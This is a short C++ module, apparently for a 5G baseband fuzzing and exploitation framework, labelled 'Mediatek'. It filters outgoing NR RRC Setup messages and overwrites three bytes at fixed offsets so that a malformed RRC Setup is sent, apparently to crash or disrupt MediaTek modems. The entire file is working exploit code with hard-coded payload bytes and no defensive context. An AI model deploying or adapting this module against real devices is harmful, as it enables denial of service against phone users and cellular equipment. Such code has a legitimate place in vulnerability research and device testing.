#include <ModulesInclude.hpp>
// Filters
wd_filter_t f1;
// Vars
const char *module_name()
{
    return "Mediatek";
}
// Setup
int setup(wd_modules_ctx_t *ctx)
{
    // Change required configuration for exploit
    ctx->config->fuzzing.global_timeout = false;
    // Declare filters
    f1 = wd_filter("nr-rrc.rrcSetup_element");
    return 0;
}
// TX
int tx_pre_dissection(uint8_t *pkt_buf, int pkt_length, wd_modules_ctx_t *ctx)
{
    // Register filters
    wd_register_filter(ctx->wd, f1);
    return 0;
}
int tx_post_dissection(uint8_t *pkt_buf, int pkt_length, wd_modules_ctx_t *ctx)
{
    if (wd_read_filter(ctx->wd, f1)) {
        wd_log_y("Malformed rrc setup sent!");
        pkt_buf[123 - 48] = 0x09;
        pkt_buf[266 - 48] = 0x6d;
        pkt_buf[267 - 48] = 0x84;
        return 1;
    }
    return 0;
}
